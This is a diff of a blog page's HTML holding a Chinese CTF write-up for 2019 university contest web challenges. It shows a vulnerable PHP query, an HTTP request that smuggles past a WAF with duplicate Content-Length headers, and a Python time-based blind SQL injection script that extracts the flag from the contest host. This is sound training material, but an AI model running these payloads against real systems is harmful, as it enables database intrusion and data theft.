+    &#123;
+        <span class="hljs-keyword">if</span> (!is_array($val))
+        &#123;
+            $newarr[$key] = mysqli_real_escape_string($mysqli, $val);
+        &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> $newarr;
+&#125;
+
+$_GET= escape($_GET);
+
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'name'</span>]))
+&#123;
+    $name = $_GET[<span class="hljs-string">'name'</span>];
+    mysqli_query($mysqli, <span class="hljs-string">"select age from user where name='$name'"</span>);
+&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'age'</span>]))
+&#123;
+    $age = $_GET[<span class="hljs-string">'age'</span>];
+    mysqli_query($mysqli, <span class="hljs-string">"select name from user where age=$age"</span>);
+&#125;</code></pre>
 
 <p>HTTP请求走私绕过waf</p>
 <p>很坑age=1+and+sleep(5)无法成功</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?age=0+or+1=1+and+sleep(5)</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 111.186.57.43:10601</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?age=0+or+1=1+and+sleep(5)</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 111.186.57.43:10601
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">DNT</span>: 1
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
+<span class="hljs-attribute">Content-Length</span>: 0
+<span class="hljs-attribute">Content-Length</span>: 0</code></pre>
 
-<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import string</span><br><span class="line">url = <span class="string">"111.186.57.43"</span></span><br><span class="line">port = <span class="number">10601</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j in string.printable:</span><br><span class="line">        s = socket.socket()</span><br><span class="line">        s.connect((url, port))</span><br><span class="line">        s.settimeout(<span class="number">3</span>)</span><br><span class="line">        data = <span class="string">"GET /?age=0 or ascii(substr((select flag_32122 from flag_xdd),"</span>.replace(<span class="string">" "</span>,<span class="string">"%20"</span>)+str(i)+<span class="string">",1))="</span>+str(ord(j))+<span class="string">" and sleep(10) HTTP/1.1\r\nHost:111.186.57.43:10601\r\nConnection:close\r\nContent-Length:0\r\nContent-Length:0\r\n\r\n"</span>.replace(<span class="string">" "</span>,<span class="string">'%20'</span>)</span><br><span class="line">        <span class="keyword">print</span> data</span><br><span class="line">        s.send(data)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s.recv(<span class="number">1024</span>)</span><br><span class="line">            s.close()</span><br><span class="line">        except:</span><br><span class="line">            flag = flag + chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            s.close()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs php">import socket
+import string
+url = <span class="hljs-string">"111.186.57.43"</span>
+port = <span class="hljs-number">10601</span>
+flag = <span class="hljs-string">""</span>
+<span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
+    <span class="hljs-keyword">for</span> j in string.printable:
+        s = socket.socket()
+        s.connect((url, port))
+        s.settimeout(<span class="hljs-number">3</span>)
+        data = <span class="hljs-string">"GET /?age=0 or ascii(substr((select flag_32122 from flag_xdd),"</span>.replace(<span class="hljs-string">" "</span>,<span class="hljs-string">"%20"</span>)+str(i)+<span class="hljs-string">",1))="</span>+str(ord(j))+<span class="hljs-string">" and sleep(10) HTTP/1.1\r\nHost:111.186.57.43:10601\r\nConnection:close\r\nContent-Length:0\r\nContent-Length:0\r\n\r\n"</span>.replace(<span class="hljs-string">" "</span>,<span class="hljs-string">'%20'</span>)
+        <span class="hljs-keyword">print</span> data
+        s.send(data)
+        <span class="hljs-keyword">try</span>:
+            s.recv(<span class="hljs-number">1024</span>)
+            s.close()
+        except:
+            flag = flag + chr(j)
+            <span class="hljs-keyword">print</span> flag
+            s.close()
+            <span class="hljs-keyword">break</span></code></pre>
 
 
 
 <h1 id="ezjava未解决"><a href="#ezjava未解决" class="headerlink" title="ezjava未解决"></a>ezjava未解决</h1><p>貌似考察fastjson反序列化漏洞不会，考完试在研究</p>
-<h1 id="ezcms未解决"><a href="#ezcms未解决" class="headerlink" title="ezcms未解决"></a>ezcms未解决</h1><p><img src="./1574339772748.png" alt="1574339772748"></p>
+<h1 id="ezcms未解决"><a href="#ezcms未解决" class="headerlink" title="ezcms未解决"></a>ezcms未解决</h1><p><img src="./1574339772748.png" srcset="/img/loading.gif" alt="1574339772748"></p>
 
-  </div>
-</article>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/11/24/WRITEUP-2019NJUPT-web%E9%A2%98%E8%A7%A3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">[WRITEUP]2019NJUPT web题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/11/19/%E7%94%A8%E8%82%9D%E5%88%B7xss-quiz/">
+                        <span class="hidden-mobile">用肝刷xss-quiz</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-    <section id="comments" class="comments">
-      <style>
-        .comments{margin:30px;padding:10px;background:#fff}
-        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
-      </style>
-      <div class="valine_comment"></div>
-<!--载入js，在</body>之前插入即可-->
-<!--Leancloud 操作库:-->
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<!--Valine 的核心代码库-->
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-  new Valine({
-      el: '.valine_comment',
-      app_id: 'iQQPWYCs248kHd506mp50DKg-gzGzoHsz',
-      app_key: 'oUxg0tEGmlJSq2r3FuvEXgr4',
-      placeholder: '这里留言。。',
-      notify: 'true',
-      verify: 'true',
-      visitor: true
-    });
-</script>
-
-    </section>
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
+            
+          </article>
+        </div>
+      </div>
     </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezpop"><span class="toc-number">2.</span> <span class="toc-text">ezpop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#几个注意点"><span class="toc-number">2.2.</span> <span class="toc-text">几个注意点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easybypass"><span class="toc-number">3.</span> <span class="toc-text">easybypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezupload"><span class="toc-number">4.</span> <span class="toc-text">ezupload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezwaf"><span class="toc-number">5.</span> <span class="toc-text">ezwaf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">5.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezjava未解决"><span class="toc-number">6.</span> <span class="toc-text">ezjava未解决</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezcms未解决"><span class="toc-number">7.</span> <span class="toc-text">ezcms未解决</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&text=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&is_video=false&description=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=2019 高校网络信息安全管理运维挑战赛web部分题解&body=Check out this article: http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&title=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&name=2019 高校网络信息安全管理运维挑战赛web部分题解&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/11/21/2019-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/&t=2019 高校网络信息安全管理运维挑战赛web部分题解" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
+      </div>
+    
   </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
+<!-- Custom -->
+
+
     
-    
-    2016-2020
-    osword
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </nav>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
   </div>
 </footer>
 
-    </div>
-    <!-- styles -->
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<!-- Plugins -->
 
-
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
-
-
-    <!-- jquery -->
-
-<script src="/lib/jquery/jquery.min.js"></script>
-
-
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-
-<!-- clipboard -->
 
   
-<script src="/lib/clipboard/clipboard.min.js"></script>
+    <script  src="/js/lazyload.js" ></script>
+  
 
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
       }
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功!");
-      e.clearSelection();
-    })
-  })
   </script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "2019 高校网络信息安全管理运维挑战赛web部分题解&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
 
-<!-- Google Analytics -->
 
-<!-- Baidu Analytics -->
 
-<!-- Disqus Comments -->
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 </body>
